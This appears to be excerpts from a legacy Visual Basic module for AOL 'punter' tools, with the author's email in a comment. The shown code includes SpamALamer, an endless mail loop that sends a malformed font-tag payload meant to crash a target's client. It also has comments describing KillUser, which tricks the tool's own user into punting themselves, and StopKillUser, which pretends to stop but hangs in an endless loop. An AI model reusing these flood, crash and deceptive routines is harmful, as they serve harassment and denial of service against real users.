Attribute VB_Name = "MuRdEr32_4v2"
...
'at this time is souljaslim69@hotmail.com You can mail me
...
End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", "RS")
End Sub
Sub IMsOn()
Call IMKeyword("$IM_ON", "CrAsH")
End Sub
...
End Sub
Sub KillUser()
'This is a very phun Sub. Put this in a punter and
'in the start button put KillUser and here is what
'happens. They think they are punting someone else
'but instead it sends them the 1 IM error punt but
'it keeps going because it loops. LoL. I would put
'the same in the stop button to get em real mad.
...
'This is going to look really strange!
'That is why it is called PhreakyAttention.
'Example
'PhreakyAttention ("This is Phreaky!!!")
...
End Function
Sub SpamALamer(LaMeR, SuBjEcT)
'Make sure to have a stop button or this will
'spam forever! Also this sends the 1 IM error punt
'in the body. LoL!!
'Example
'SpamALamer ("Punterprgr, You are dumb!")
Do:
DoEvents
Call SendMail(LaMeR, SuBjEcT, "<font =999999999999999999999999999999999999999999999999999999999999999999999999")
Loop
End Sub
...
Sub StopKillUser()
'This stops KillUser
MsgBox "You are lucky RS and CrAsH did not own you fool!", vbInformation, "LoL"
Do
DoEvents
Loop
End Sub
...
'This is new too. It underlines chat text.
